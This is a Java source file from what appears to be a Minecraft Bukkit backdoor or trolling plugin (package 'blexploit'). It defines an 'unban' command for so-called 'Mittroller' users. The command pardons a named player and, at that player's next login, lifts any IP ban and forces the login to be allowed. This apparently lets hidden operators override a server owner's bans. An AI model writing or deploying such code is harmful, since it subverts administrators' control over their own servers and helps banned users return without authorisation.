package de.blexploit.command.cmds;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.BanList.Type;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Unban extends Command implements Listener {

	public static ArrayList<String> unblockIp = new ArrayList<String>();

	public Unban() {
		super("unban", "Entbannt einen Spieler", TabManager.INSERT_PLAYERNAME);
	}

	@SuppressWarnings("deprecation")
	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 2) {
			OfflinePlayer victim = Bukkit.getOfflinePlayer(args[1]);
			if (victim != null) {
				Bukkit.getBanList(Type.NAME).pardon(victim.getName());
				unblockIp.add(victim.getName());
				this.SpielerInfo(mt, "hat §c" + victim.getName() + CHAT_COLOR + " entsperrt!");
			} else {
				mt.fehler("Dieser Spieler war noch nie auf den Server!");
				mt.benutze(this);
			}
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}

	@EventHandler
	private void onLogin(PlayerLoginEvent e) {
		if (unblockIp.contains(e.getPlayer().getName())) {
			Bukkit.unbanIP(e.getAddress());
			e.allow();
			unblockIp.remove(e.getPlayer().getName());
		}
	}

}
